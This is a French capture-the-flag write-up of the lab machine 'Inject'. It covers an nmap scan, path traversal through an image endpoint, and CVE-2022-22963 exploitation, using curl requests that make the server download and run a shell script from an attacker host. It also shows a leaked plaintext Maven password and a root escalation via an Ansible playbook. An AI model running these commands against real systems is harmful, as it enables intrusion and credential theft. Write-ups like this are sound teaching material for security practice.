# Inject - Easy

```bash
nmap -sV -sC 10.10.11.204 -p-
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-13 17:07 EDT
Nmap scan report for 10.10.11.204
Host is up (0.060s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.04 seconds
```

On visite donc le site sur le port 8080, on lance un gobuster en fond.

On remarque sur la page upload lorsque l’on upload une image elle est ajoutée ici:

```bash
http://10.10.11.204:8080/show_image?img=photo-1533450718592-29d45635f0a9-1129768782.jpeg
```

On essaye donc une LFI avec burpsuite et on peut lire le fichier.

On sait donc qu’il y a les utilisateurs frank et phil, on essaye de récupérer les fichiers du site, vu que on peut énumérer les répertoires avec le lien précédent c’est facile de trouver le site:

```java
/var/www/WebApp/

private static String UPLOADED_FOLDER = "/var/www/WebApp/src/main/uploads/";

    @GetMapping("")
    public String homePage(){
        return "homepage";
    }

    @GetMapping("/register")
    public String signUpFormGET(){
        return "under";
    }

    @RequestMapping(value = "/upload", method = RequestMethod.GET)
    public String UploadFormGet(){
        return "upload";
    }

    @RequestMapping(value = "/show_image", method = RequestMethod.GET)
    public ResponseEntity getImage(@RequestParam("img") String name) {
        String fileName = UPLOADED_FOLDER + name;
        Path path = Paths.get(fileName);
        Resource resource = null;
        try {
            resource = new UrlResource(path.toUri());
        } catch (MalformedURLException e){
            e.printStackTrace();
        }
        return ResponseEntity.ok().contentType(MediaType.IMAGE_JPEG).body(resource);
    }

    @PostMapping("/upload")
    public String Upload(@RequestParam("file") MultipartFile file, Model model){
        String fileName = StringUtils.cleanPath(file.getOriginalFilename());
        if (!file.isEmpty() && !fileName.contains("/")){
            String mimetype = new MimetypesFileTypeMap().getContentType(fileName);
            String type = mimetype.split("/")[0];
            if (type.equals("image")){

                try {
                    Path path = Paths.get(UPLOADED_FOLDER+fileName);
                    Files.copy(file.getInputStream(),path, StandardCopyOption.REPLACE_EXISTING);
                } catch (IOException e){
                    e.printStackTrace();
                }
                model.addAttribute("name", fileName);
                model.addAttribute("message", "Uploaded!");
            } else {
                model.addAttribute("message", "Only image files are accepted!");
            }
            
        } else {
            model.addAttribute("message", "Please Upload a file!");
        }
        return "upload";
    }

    @GetMapping("/release_notes")
    public String changelog(){
        return "change";
    }

    @GetMapping("/blogs")
    public String blogPage(){
        return "blog";
    }
```

Avec le code source on va donc essayer d’exploiter l’upload en uploadant une reverse shell mais finalement ce n’est pas possible car rien ne passe le filtre. On essaye de chercher dans les fichiers du serveur. En consultant le pom.xml on se rend compte que une des dépendances est vulnérable

[https://spring.io/security/cve-2022-22963](https://spring.io/security/cve-2022-22963)

[https://github.com/me2nuk/CVE-2022-22963](https://github.com/me2nuk/CVE-2022-22963)

```bash
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl http://10.10.16.6:8000/shell.sh > /tmp")' --data-raw 'data' -v
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("chmod +x /tmp/shell.sh")' --data-raw 'data' -v
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("/tmp/shell.sh")' --data-raw 'data' -v

```

On obtient un reverse shell. On trouve un playbook dans /opt

```bash
cat playbook_1.yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```

Et on trouve ça dans .m2

```bash
cat settings.xml 
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

On se connecte avec su en tant que phil vu que le ssh ne marche pas. On obtient le flag user

```bash
script -qc /bin/bash /dev/null
```

On obtient facilement le root avec le playbook trouvé précedemment:

[https://rioasmara.com/2022/03/21/ansible-playbook-weaponization/](https://rioasmara.com/2022/03/21/ansible-playbook-weaponization/)

On attend et on fait 

```bash
bash -p
```